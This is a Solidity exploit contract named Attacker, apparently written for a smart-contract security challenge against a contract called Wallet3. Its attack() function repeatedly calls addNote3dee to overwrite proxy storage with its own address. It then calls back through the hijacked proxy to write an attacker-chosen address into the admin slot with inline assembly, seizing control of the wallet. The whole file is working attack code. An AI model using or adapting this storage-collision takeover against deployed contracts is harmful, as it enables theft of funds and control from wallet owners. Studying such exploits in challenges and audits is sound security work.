// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Wallet3} from "../src/Wallet3.sol";

contract Attacker {
    Wallet3 public immutable target;
    address public newAdmin;
    bytes32 internal constant ADMIN_SLOT =
        0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0d00;


    event AdminWritten();

    constructor(Wallet3 _target) {
        target = _target;
    }

    function setNewOwner(address _newAdmin) public {
        newAdmin = _newAdmin;
    }

    function attack() public {
        uint256 diff = uint256(
            0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cfb
        ) -
            uint256(
                0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6
            );
        for (uint256 i = 0; i < diff + 1; i++) {
            target.addNote3dee(bytes32(abi.encode(address(this))));
        }

        Attacker takenOverProxy = Attacker(payable(address(target)));
        takenOverProxy.writeNewAdmin(newAdmin);
    }

    function writeNewAdmin(address _newAdmin) public {
        bytes32 slot = ADMIN_SLOT;
        assembly {
            sstore(slot, _newAdmin)
        }
        emit AdminWritten();
    }

    receive() external payable {
        attack();
    }
}
